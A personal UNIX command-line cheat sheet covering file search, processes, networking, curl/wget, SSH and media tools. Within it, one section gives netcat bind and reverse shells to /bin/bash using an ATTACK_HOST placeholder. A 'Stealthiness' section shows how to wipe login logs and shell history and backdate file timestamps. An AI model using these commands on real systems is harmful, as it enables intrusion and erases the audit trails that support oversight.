-*- eval: (visual-line-mode 0) -*- #
# .always_forget.txt
#
# awdeorio's UNIX cheat sheet
#
# Andrew DeOrio <awdeorio@umich.edu>

# Users and Groups
adduser USER                            # add USER (Debian)
pushd DIR                               # push DIR onto stack (bash)
popd                                    # pop dir off stack and cd there (bash)
dirs -v                                 # print stack (bash)
cd ~2                                   # cd to 2nd dir on stack (bash)
cp FILE ~2                              # use ~2 as an alias for a DIR (bash)
cp -L                                   # Copy files pointed to by symlinks

# Paths and executables
which CMD                               # print path to CMD
which -a CMD                            # print all paths to CMD (GNU)
whereis CMD                             # print all paths to CMD
export PATH=$PATH:NEW_DIR               # add new directory to PATH (bash)
type -a CMD                             # include shell functions/aliases (bash)

# Finding files
find . -name hello.txt                  # find hello.txt, starting at PWD
find / -name hello.txt                  # find hello.txt, starting at /
find '*.txt'                            # txt files
find '*hello*'                          # anything with "hello" in the filename
find -type f                            # plain files
find -type d                            # directories
find -name '*~' -exec rm -v {} \;       # remove tilde files
find -name '*~' | xargs rm -v           # remove tilde files
find -name GLOB -depth -delete          # remove files
find -exec grep -H PATTERN {} \;        # find + grep, grep will print filenames
find | xargs grep -H PATTERN            # find + grep, grep will print filenames
find -print0 | xargs -0 CMD             # handle spaces in filenames
find | xargs -n1 CMD                    # process files one at a time
find -mtime 3 -type f                   # files modified exactly 3 days ago
find -mtime -3 -type f                  # files modified less than 3 days ago
find -mtime +3 -type f                  # files modified more than 3 days ago
find . -not -path '*/\.git*'            # ignore .git dir
find . -type f -not -wholename '*\.git*' -exec file {} \; | grep CRLF  # Windows line endings
locate FILE                             # search system database for hello.txt
mdfind FILE                             # ^^^ Some macOS systems
grep -r PATTERN .                       # recursively search file content
grep -rI PATTERN .                      # ^^^ ignoring binary files
git grep PATTERN                        # recursively search git-controled files
ag PATTERN                              # The Silver Searcher, see section below
ag PATTERN --color | less -r
ag -l                                   # Filenames only
ag --ignore '*test*'                    # Ignore files/directories with "test"
ag -f                                   # Follow symlinks
ag -Q                                   # Do not parse PATTERN as regex
ag --hidden master --ignore .git

# Superuser permissions
su                                      # switch user to root
su USER                                 # switch user to USER
sudo -s                                 # switch user to root
sudo CMD                                # run CMD as root
sudo CMD                                # run CMD as root
sudo -u USER CMD                        # run CMD as USER
sudoedit FILE                           # edit file as root
visudo                                  # edit /etc/sudoeors config file
sudo -k                                 # empty cache that stores your password
sudo -E                                 # preserve environment variables
sudo "PATH=$PATH" -E                    # ^^^ including PATH
sudo -v                                 # cache sudo credentials, for scripts
newgrp GROUP                            # change default group temporarily

# Processes and Threads
ps                                      # display my processes
ps -u USER                              # ^^^ USER's processes
ps -ax                                  # all processes on the machine
ps -axM                                 # all processes and threads (BSD)
ps axm                                  # all processes and threads (GNU)
ps -M                                   # threads (BSD)
ps -m                                   # threads (GNU)
ps -ww                                  # don't chop long lines
ps -c                                   # basename of executable instead of full
ps -axvcm                               # sort by memory usage
ps -axvcr                               # sort by CPU usage
pstree                                  # visualization of processes
top                                     # dynamic view of processes
top -H                                  # dynamic view of threads
top -b -n7 -d0.5 | grep ^Cpu | sed 1d | grep -oE '[0-9]+\.?[0-9]*% *id' | grep -oE '[0-9]+\.?[0-9]*' | awk '{sum+=$0} END {print sum/NR}' # CPU usage (%)
htop                                    # fancy performance monitor
  "M"                                   # htop sort by memory usage
  "P"                                   # htop sort by processor usage
  "T"                                   # htop sort by time
  "p"                                   # htop toggle process fullname/basename
  "t"                                   # htop toggle tree view
nmon                                    # fancy performance monitor
pgrep STRING                            # search for processes, return PID
pgrep -af STRING                        # ^^^ full process name & args (GNU)
pgrep -lf STRING                        # ^^^ full process name & args (BSD)
pgrep -u USER                           # only match USER's processes
pkill                                   # ^^^ and kill process
pkill -f                                # ^^^ full process name & args
kill PID                                # kill process with PID
kill -PID                               # kill process group with PID
kill -9 PID                             # kill process using signal 9
kill -0 PID                             # Check if process is running
kill -0 PID &>/dev/null && echo running # Check if process is running
killall NAME                            # kill all processes with NAME
killall -9 NAME                         # kill all using signal 9
CMD &                                   # start CMD in the background
jobs                                    # list active or suspended jobs
fg                                      # bring background command to foreground
[control-z]                             # suspend current CMD
bg                                      # send suspended CMD to background
disown                                  # alternative to "bg", but like nohup
nohup CMD &                             # logout won't stop CMD
nohup nice CMD &                        # lower priority
nohup CMD < /dev/null > LOG 2>&1        # redirect all streams
nohup CMD 0<&- &> /dev/null &           # redirect all streams
lsof                                    # list open files owned by processes
cat /proc/<PID>/environ | tr '\000' '\n'# inspect environment of running proc

# Commonly used signals
1  HUP  SIGHUP   hang up; automatic on logout; reload configuration for daemons
2  INT  SIGINT   interrupt, Control-C
3  QUIT SIGQUIT  quit
6  ABRT SIGABRT  abort
9  KILL SIGKILL  non-catchable, non-ignorable kill; "rude shutdown"
14 ALRM SIGALRM  alarm clock
15 TERM SIGTERM  software termination signal; "polite shutdown request"
   EXIT          program exit, any exit code (pseudo-signal, bash only)
   ERR           program exit, non-zero (pseudo-signal, bash only)

# Environment
printenv                                # List environment variables
env                                     # List environment variables
set                                     # List env vars, local vars, functions
echo $VARIABLE                          # Print one environment variable
printenv VARIABLE                       # Print one environment variable
env -i CMD                              # Run CMD with empty environment
env --unset VARIABLE                    # unset VARIABLE
unset VARIABLE                          # unset VARIABLE (Bash built-in)
$PATH                                   # Command search path
$PS1                                    # Shell prompt
$LD_LIBRARY_PATH                        # Run time library resolution
$MANPATH                                # man search dirs

# Manual network configuration (DHCP)
killall dhcpcd
ifconfig eth1 down
ifconfig eth1 hw ether '00:16:cb:05:3b:10'  # spoof MAC addr
iwconfig eth1 key PASSWORD
iwconfig eth1 essid SSID
ifconfig eth1 up
dhcpcd -t 10 -N eth1

# Manual network configuration (static IP)
# NOTE: many of these commands are replaced by the "ip" program's subcommands
nmap -sn '141.212.106.*'  # see what IP addresses are in use
dig -x 141.212.106.7      # verify that my IP is not in DHCP space
ifconfig eth0 down
ifconfig eth0 141.212.106.7 broadcast 141.212.106.255 netmask 0xffffff80 up
route flush     # remove all routes
route add default gw 141.212.106.1
edit /etc/resolv.conf
  > search eecs.umich.edu
  > nameserver 141.213.4.4
  > nameserver 141.213.4.5
  > nameserver 141.213.13.31

# Network Utilities
# Cheat sheet https://pbs.twimg.com/media/DzP-KfpV4AA4TH2.jpg
ping HOST                               # Check if a host is up
ping -c3 HOST                           # Only send 3 packets
ping -Iwlan0 HOST                       # Ping with a specific NIC
host HOST                               # DNS lookup
dig HOST                                # DNS lookup
dig +short HOST                         # DNS lookup, scriptable
dig +trace HOST                         # DNS lookup with full tree
dig +trace +all HOST                    # DNS lookup with full tree, max detail
nslookup                                # DNS lookup
nslookup -type=ns HOST                  # DNS with authoritative name servers
dig -x IP                               # reverse DNS lookup
dig +short -x IP                        # reverse DNS lookup, scriptable
cat /etc/resolv.conf                    # what are my DNS servers?
whois HOST                              # domain name registration info
nmap HOST                               # what ports are open?
nmap -A -T4 HOST                        # what ports are open?
nmap -sn -PR 192.168.0.0/24             # which hosts are up my subnet?
nmap -p80 192.168.1.0/24                # Hosts with port 80 open
nmap -p80 192.168.1.0/24 -oG - | grep open # Hosts with port 80 open, grepable
netstat -at                             # list TCP connections
netstat -au                             # list UDP connections
netstat -ant                            # disable DNS lookup (faster)
netstat -tl                             # listening TCP connections
netstat -atn | grep ':22'               # ssh connections on this machine?
netstat -l numeric-ports | grep 80      # what's using port 80?
sudo fuser -v -n tcp 80                 # who's using port 80?
lsof -n -i :80                          # who's using port 80?
lsof -nP -iTCP:4000 -sTCP:LISTEN        # who's listening on port 4000?
nc HOST PORT                            # intiate connection "cat over a socket"
nc -c                                   # close connection after send (GNU)
nc -q                                   # close connection after send (BSD)
nc                                      # close connection after send (BSD)
nc -l -p PORT                           # listen for incoming connection (GNU)
nc -l localhost PORT                    # listen for incoming connection (BSD)
nc -v -z HOST PORT                      # check connection to HOST on PORT
ncat -w 2 -v HOST PORT                  # check connection to HOST on PORT
traceroute                              # route packets take to network host
curl https://freegeoip.app/json/        # IP geolocation
curl 'https://api.ipgeolocation.io/ipgeo?apiKey=API_KEY'  # ^^^ API_KEY from dashboard https://app.ipgeolocation.io/
open https://github.com/stefansundin/traceroute-mapper  # ^^^ visualization
[sudo] mtr HOST                         # dynamically updated traceroute info
mtr --no-dns --report --report-cycles 60# one report generated over 60s
telnet HOST 80                          # connect to web server
openssl s_client -quiet -connect www.google.com:443 # ^^^ with SSL
tcpdump                                 # watch packets on all network ifcs
tcpdump -i eth0                         # watch packets on one network interface
tcpdump tcp                             # only one protocol
tcpdump port 80                         # only one port
tcpdump host 1.2.3.4                    # only one host
tcpdump dst 1.2.3.4                     # only one dest
tcpdump src 1.2.3.4                     # only one source
tcpdump -S "tcp[tcpflags] & (tcp-syn|tcp-ack|tcp-fin) != 0" # 3-way handshake
tcpdump -S "port 80 and (tcp[tcpflags] & (tcp-syn|tcp-ack|tcp-fin) != 0)" #  3-way handshake on port 80
tcpdump -S "host web.eecs.umich.edu and port 80 and (tcp[tcpflags] & (tcp-syn|tcp-ack|tcp-fin) != 0)"   # 3-way handshake on port 80
tcpdump -S -s0 -A port 80               # Sniff HTTP packets in ASCII format
tcpdump -w FILE.pcap                    # Save raw packet data to FILE
tcpdump -r FILE.pcap                    # Read and parse packet data from FILE
tshark                                  # CLI packet analysis
tshark -r FILE.pcap                     # ^^^ from file
tshark -Tfields -e text                 # ^^^ any sent text
tshark -Tfields -e http.file_data       # ^^^ HTTP payload
tshark -Tfields -e _ws.col.Protocol -e _ws.col.Info  # Manually specify defaults
tshark -Tfields -e _ws.col.Protocol -e _ws.col.Info -e http.file_data  # HTTP, defaults
tshark -O http -Y "http.request || http.response"  # HTTP with headers
iftop                                   # display bandwidth usage
ngrep                                   # grep for network
sudo ngrep -d any google                # see traffic to/from Google
mitmproxy                               # spy on SSL connections
p0f                                     # OS fingerprinting
ntop                                    # See what's using network bandwidth
iftop                                   # See what's using network bandwidth
siege                                   # Load testing tool

# Example: observing an HTTP request
echo '<html><body>Hello world!</body></html>' > index.html   # Simple HTML
python3 -m http.server                                       # Start server
sudo tcpdump -i lo0 port 8000 -w get.pcap                    # Start tcpdump
curl -v 127.0.0.1:8000/index.html                            # Request
tshark -r get.pcap -Tfields -e _ws.col.Protocol -e _ws.col.Info -e http.file_data  # Read pcap

# Web Utilities
python -m SimpleHTTPServer 8000         # start a file server at ./ on port 8000
python3 -m http.server 8000             # start a file server at ./ on port 8000
wget https://www.google.com/            # download one page
wget -m andrewdeorio.com                # download everything
wget URL -O FILE                        # output to FILE
wget --random-wait                      # avoid a blacklist with random timing
wget -r                                 # recursive (default max depth 5)
wget -p                                 # include all files, including images
wget -e robots=off                      # disregard robots.tx
wget -U mozilla/5.0                     # User-agent (browser identity)
wget --limit-rate=20k                   # reduce download rate
wget -b                                 # background
wget -o FILE                            # log output
wget --random-wait -r -p -e robots=off -U mozilla/5.0 URL  # crawler
wget --random-wait -r -p -e robots=off -U mozilla/5.0 URL -b -o log  # crawler
wget --spider                           # check if file exists
wget --timestamping                     # check if file has changed
youtube-dl URL                          # download a youtube video
curl                                    # download a single web page
curl -v                                 # include headers
curl -L                                 # follow redirects
curl -k                                 # insecure mode, ignore SSL certs
curl -I                                 # headers only
curl --verbose                          # watch protocol in action
curl --trace-ascii log.txt              # watch protocol in action, more detail
curl --trace-ascii log.txt --trace-time # include timing
curl --data "query=aa" http://localhost:5000/query # send POST request
curl -H "Content-type: application/json" \         # POST JSON
     -X POST http://127.0.0.1:5000/ \
     -d '{"message":"Hello Data"}'
curl --user-agent "Mozilla/5.0"         # Fake the user agent
curl ifconfig.me                        # what is my IP address?
curl ipinfo.io/ip                       # what is my IP address?
curl https://freegeoip.app/json/IP      # geolocation data for IP address
ipcalc                                  # see what an IP or CIDR means
httping HOST:PORT                       # check if an HTTP server is up
curl --output /dev/null --silent --insecure --head --fail URL # check HTTP up
dig +short myip.opendns.com @resolver1.opendns.com # what is my IP address?
vnu --root DIR                          # HTML5/W3C validator
html5validator --root DIR               # HTML5/W3C validator
linkchecker index.html                  # Verify internal links
linkchecker index.html --check-extern   # Verify internal and external links
webkit2png https://google.com           # Screenshot web page
webkit2png google.htm                   # Screenshot saved web page
ls *.html | xargs -n1 webkit2png        # Screenshot many saved web pages
speedtest                               # Test upload and download speeds

# Echo server
http POST httpbin.org/anything x=y      # Public echo server test
echo -e "HTTP/1.1 200 OK\n\n{}\n" | nc -l -p 8000  # Local CLI echo server
npm install --global http-echo-server   # http-echo-server install
http-echo-server                        # http-echo-server run
http POST localhost:56406 key=value     # http-echo-server test

# Curl: test website loading speed / latency
curl \
  https://www.google.com \
  --silent \
  -o /dev/null \
  --write-out \
'%{url_effective}
Lookup:\t\t%{time_namelookup}
Connect:\t%{time_connect}
App Connect:\t%{time_appconnect}
Redirect:\t%{time_redirect}
Pre-transfer:\t%{time_pretransfer}
Start-transfer:\t%{time_starttransfer}
------------------------
Total Time:\t%{time_total}
'

# Curl: log in with cookies
curl \
  --request POST \
  --cookie-jar cookies.txt \
  --form 'username=awdeorio' \
  --form 'password=password' \
  --form 'submit=login' \
  ${BASE_URL}/accounts/login/
curl \
  --cookie cookies.txt \
  ${BASE_URL}/api/

# Wget: log in with cookies
wget \
  --post-data 'username=awdeorio&password=password&submit=login' \
  --save-cookies cookies.txt \
  --keep-session-cookies \
  ${BASE_URL}/accounts/login/
wget \
  --load-cookies cookies.txt \
  ${BASE_URL}/api/

# HTTPie
http HOST                               # GET request to HOST
http POST URL K1=V1 K2=V2 ...           # POST JSON with key/value pair(s)
http POST URL K1:='{"K2":"V2"}'         # POST escaped nested JSON value
http POST URL K1=V1 K2=V2 --form ...    # POST HTTP form
http -a USERNAME:PASSWORD               # Authenticate with basic HTTP auth
http --verify=no                        # Do not check SSL certificate

# HTTPie and session cookies
# 1. Log in using an HTML form, saving cookies to file session.json
# 2. Reuse HTTPie file session.json
http --session=./session.json --form POST URL username=X password=Y
http --session=./session.json URL

# Jekyll static web sites
jekyll doctor                           # Verify config files
jekyll build                            # Build site to _site/
jekyll serve                            # Start live dev server
bundle exec jekyll                      # Locally installed Jekyll

# Primer Spec Preview
gem install bundler
bundle install
bundle update --all                     # Update lock file
bundle exec jekyll serve

# Backdoor shell using netcat
# Note: this version of netcat (ncat) ships with nmap
TARGET_HOST $ ncat -lvp 8080 -e /bin/bash --ssl
ATTACK_HOST $ ncat TARGET_HOST 8080 --ssl

# Backdoor reverse shell using netcat
# This works when the firewall prevents incoming connections
# Note: this version of netcat (ncat) ships with nmap
ATTACK_HOST $ ncat -l -p 8080 -vv --ssl
TARGET_HOST $ ncat -e /bin/bash ATTACK_HOST 8080 --ssl

# Stealthiness
last                                    # successful login history
lastb                                   # bad login attempts
lastlog                                 # most recent login
echo > /var/log/wtmp                    # clear successful login history
echo > /var/log/btmp                    # clear bad login history
echo > /var/log/lastlog                 # clear recent login history
unset HISTFILE                          # don't write history for this session
history -c                              # clear shell history
edit ~/.history ~/.bash_history         # edit history
touch -d "2 hours ago" FILE             # change atime, mtime w/ relative time
touch -d "2016-01-01"                   # ^^^ date
touch -d "2016-01-01 12:34:56"          # ^^^ date and time
touch -d "2015-01-01 12:34:56 +0400"    # ^^^ date, time, w/ time zone
touch -r REF_FILE FILE                  # match attributes of FILE to REF_FILE
edit /var/log/{messages,syslog}         # remove info about changed time

# Tor from the command line
#
# configuration (optional)
$EDITOR /usr/local/etc/tor/torrc
#
# Start Tor proxy
$ tor
...
Dec 13 09:23:17.000 [notice] Bootstrapped 100%: Done
#
# Tor opens a SOCKS proxy on localhost:9050 by default.  Check open port.
$ nc -v -z localhost 9050
localhost [127.0.0.1] 9050 open
#
# What is my IP?  (with Tor)
$ curl --socks5 localhost:9050 ipinfo.io/ip
62.210.81.152
#
# What is my IP?  (with Tor)  This one won't work on OSX
$ torsocks curl ipinfo.io/ip
62.210.81.152
#
# What is my IP? (without Tor)
$ curl ipinfo.io/ip
141.212.107.235

# Firewall / iptables
iptables -L                             # List current rules
iptables -A INPUT -p tcp --dport ssh -j ACCEPT  # Accept SSH traffic
iptables -A INPUT -p tcp --dport 80 -j ACCEPT   # Accept web traffic
sudo iptables -A INPUT -j DROP          # Block all other traffice
iptables -F                             # Flush all rules
iptables -P INPUT ACCEPT                # 1. Temporarily disable firewall
iptables -P OUTPUT ACCEPT               # 2. Temporarily disable firewall
iptables -P FORWARD ACCEPT              # 3. Temporarily disable firewall
iptables -F                             # 4. Temporarily disable firewall

# Shell communication
wall                                    # send message to all terminals
write USER                              # send message to USER

# Email
sendmail user@example.com < email.txt   # send email from CLI
sendmail -t < email.txt                 # read "TO" field from file
mailmerge                               # mailmerge from CLI
mailmerge <<< $MAILPASS                 # automate password entry

# Email / Test SMTP server
# https://github.com/jetmore/swaks/blob/master/doc/base.pod
swaks --to user@example.com --server test-server.example.net

# Audio
alsamixer                               # change volume
amixer -c 0 sset Master '6%+'           # change volume
amixer -c 0 sset Headphone toggle       # toggle speakers/headphones
mplayer "$(ls | shuf -n1)"              # select and play a random file

# Video

# Read video device live
mplayer tv://
mplayer tv:// -tv driver=v4l2:width=352:height=288:device=/dev/video0 -fps 20
vlc v4l2:///dev/video0

# Record video
mencoder tv:// -tv driver=v4l2:width=352:height=288:device=/dev/video0:forceaudio:adevice=/dev/dsp -fps 20 -ovc lavc -oac mp3lame -lameopts cbr:br=64:mode=3 -o file.avi

# Record video without audio
mencoder tv:// -tv driver=v4l2:width=352:height=288:device=/dev/video0 -fps 20 -nosound -ovc lavc -o file.avi

# Convert mov to mp4
ffmpeg -i source.mov target.mp4

# Convert VOB to mp4
# http://stackoverflow.com/questions/13560852/convert-mp4-to-maximum-mobile-supported-mp4-using-ffmpeg
ffmpeg -i concat:"/media/dvd/VIDEO_TS/VTS_01_1.VOB | /media/dvd/VIDEO_TS/VTS_01_2.VOB" -acodec libfaac -aq 100 -ac 2 -vcodec libx264 -vpre slow -crf 24 -threads 0 output.mp4

# Compress mp4 video to 480p at 500kbit/s mp4
ffmpeg -i input.mp4 -vcodec libx264 -vprofile high -preset slow -b:v 500k -maxrate 500k -bufsize 1000k -vf scale=-1:480 -threads 0 -b:a 128k output_file_480p.mp4

# Compress mp4 video to 360p at 250kbit/s mp4
ffmpeg -i input.mp4 -vcodec libx264 -vprofile baseline -preset slow -b:v 250k -maxrate 250k -bufsize 500k -vf scale=-1:360 -threads 0 -ab 96k output_360p.mp4

# Stream live video
cvlc v4l2:///dev/video0 :v4l2-standard= :input-slave=alsa://hw:0,0 :live-caching=300 :sout="#transcode{vcodec=WMV2,vb=800,scale=1,acodec=wma2,ab=128,channels=2,samplerate=44100}:http{dst=:8080/stream.wmv}"

# Stream live video without audio
cvlc v4l2:///dev/video0 :v4l2-standard= :live-caching=300 :sout="#transcode{vcodec=WMV2,vb=800,scale=1,select=noaudio}:http{dst=:8080/stream.wmv}"

# Stream live video without audio, and lower frames-per-second (10)
cvlc v4l2:///dev/video0 :v4l2-standard= :live-caching=300 :sout="#transcode{vcodec=WMV2,vb=800,scale=1,fps=10,select=noaudio}:http{dst=:8080/stream.wmv}"

# View live video stream
vlc http://HOST:8080/stream.wmv
mplayer http://HOST:8080/stream.wmv

# Create GIF from video
# ffmpeg -r N means reduce to N fps
# gifsicle --delay=N means delay N*10 ms between frames
ffmpeg -i "$INFILE" -pix_fmt rgb8 -r 10 -f gif - | gifsicle --delay=10 --optimize=3 > "$OUTFILE"

# Images
mogrify -rotate 90                     # rotate
mogrify -resize 640x640                # reduce resolution
convert FILE.png FILE.jpg              # convert image file type
convert IN.jpg -monochrome OUT.jpg     # convert image to black and white
mogrify -quality 85%                   # reduce file size
mogrify -define jpeg:extent=100KB      # reduce file size to max 100KB
mogrify -strip -define jpeg:extent=100KB  # Web images
imageoptim FILE.jpg                    # reduce file size
imageoptim '*.jpg'                     # reduce file size
exiftool                               # read all exif data
exiftool '-AllDates+=3:02:00 00:00:00' # date/time += 3 yr 2 mos
exiftool -gpslatitude -gpslongitude    # GPS coordinates
identify FILE.jpg                      # dump size and other data
identify -format "%w×%h"               # dump length, height https://imagemagick.org/script/escape.php
identify -verbose FILE.jpg             # dump EXIF data
mogrify -strip                         # remove EXIF data

# SSH
ssh HOST                               # connect to HOST
ssh USER@HOST                          # connect to HOST as USER
ssh -t HOST1 HOST2                     # connect to HOST2 through HOST1
ssh -A                                 # forward SSH keys
ssh -vT                                # debug authentication issues
ssh -T                                 # don't set up a terminal
ssh -v                                 # verbose
ssh -vvv                               # super verbose
ssh -f                                 # go to background
ssh -N                                 # don't execute a remote command
ssh -n                                 # redirect stdin from /dev/null
ssh -vnNTL 8000:localhost:8000 HOST    # local port forwarding, 1 hop
ssh -vnNTL 8000:HOST2:8000 HOST1       # local port forwarding, 2 hop
ssh -vnNTR 8000:localhost:8000 HOST    # remote port forwarding
ssh -D8000 HOST                        # dynamic application-level port forward
ssh HOST CMD                           # execute CMD on HOST
ssh HOST -- CMD                        # execute CMD on HOST, with CMD options
yes | pv | ssh HOST "cat > /dev/null"  # network throughput test

# SSH keys
ssh-keygen -t ed25519 -C EMAIL         # generate SSH keys, BEST
ssh-keygen -t rsa -b 4096 -C EMAIL     # generate SSH keys, legacy
ssh-keygen -R HOST                     # remove HOST from known_hosts
ssh-add -L                             # print public key from agent

# SSH install public key on host
ssh-copy-id HOST
cat ~/.ssh/id_rsa.pub | ssh HOST "mkdir -p ~/.ssh && cat >> ~/.ssh/authorized_keys"
gpg --export-ssh-key awdeorio | ssh HOST "cat >> ~/.ssh/authorized_keys"

# SSH agent save SSH key passphrases
# https://docs.github.com/en/authentication/connecting-to-github-with-ssh/generating-a-new-ssh-key-and-adding-it-to-the-ssh-agent#adding-your-ssh-key-to-the-ssh-agent
pkill ssh-agent                        # stop SSH agent
eval "$(ssh-agent)"                    # start SSH agent
pgrep ssh-agent                        # status SSH agent (expect one PID)
echo $SSH_AGENT_PID                    # print SSH agent env vars
echo $SSH_AUTH_SOCK                    # print SSH agent env vars
ssh-add -L                             # print public key from agent
ssh -vT HOST                           # test connection

# SSH debug
ssh -vT git@github.com                 # Test connection
chmod go-w ~/                          # Fix SSH key permissions
chmod 700 ~/.ssh                       # Fix SSH key permissions
chmod 644 ~/.ssh/authorized_keys       # Fix SSH key permissions
ssh-add -L                             # print public key from agent

# SSH agent forwarding (github example)
# https://developer.github.com/guides/using-ssh-agent-forwarding/
local > ssh -T git@github.com           # check github connection
local > echo $SSH_AUTH_SOCK             # check ssh-agent is running
local > ssh-add -L                      # check key is added
local > ssh-add ~/.ssh/id_dsa           # add my key, temporary
local > ssh-add -K ~/.ssh/id_dsa        # add my key, permanent, OSX
local > ssh -A SERVER                   # ssh to server, forwarding key
remote> server $ ssh -T git@github.com  # check github connection
server $ echo $SSH_AUTH_SOCK            # check ssh-agent is running
server $ git remote -v                  # check repo is cloned with SSH URL
server $ sudo -E                        # preserve environment when using sudo

# SSH Port Forwarding Explained
# https://vimeo.com/54505525#t=1029s
#
# Local port forwarding allows connections to be made from the local network,
# through the SSH server, and to a remote host
#  - SSH client -> SSH server -> remote host
#  - e.g. connect to a staging environment SQL database
#  - e.g. connect to a VNC server
#  - e.g. bypass firewall for any server (as long as you have SSH)

# Local port forward localhost:8080 -> REMOTEHOST:80
ssh -vnNTL 8080:localhost:80 REMOTEHOST
curl https://localhost:8080
  +---------------+          +--------------+
  |   localhost   |---SSH---\|  REMOTEHOST  |
